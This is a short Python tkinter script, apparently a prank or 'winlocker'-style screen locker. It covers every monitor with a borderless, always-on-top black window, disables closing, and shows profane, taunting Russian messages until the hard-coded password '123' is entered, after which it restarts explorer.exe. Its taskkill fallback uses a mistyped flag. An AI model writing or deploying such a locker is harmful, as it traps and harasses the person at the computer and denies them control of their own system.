from tkinter import *
from subprocess import Popen as cmd
import sys
import ctypes

NameFile = sys.argv[0]

# Получаем разрешение виртуального экрана (всех мониторов)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
total_width = user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
total_height = user32.GetSystemMetrics(79)  # SM_CYVIRTUALSCREEN
virtual_x = user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
virtual_y = user32.GetSystemMetrics(77)  # SM_YVIRTUALSCREEN

root = Tk()

def CheckPassword(arg):
    if password.get() == "123":
        root.destroy()
        cmd("start explorer.exe", shell=True)
        # Универсальный вариант!
        try:
            quit()
        except:
            cmd(f"taskkill /f /in {NameFile}", shell=True)

X = total_width  # Используем ширину всех экранов
Y = total_height  # Используем высоту всех экранов

bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # То же самое что Quit только упрощенно
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}+{virtual_x}+{virtual_y}")  # Размещаем окно на всей доступной области
root.overrideredirect(1)  # Убираем рамки окна

Label(text="ТЫ ЗАЕБАЛ УЖЕ НАХОДИТЬ СПОСОБЫ!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nСУКА ТОЛЬКО ПОПРОБУЙ УЗНАТЬ", fg="white", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)

root.mainloop()
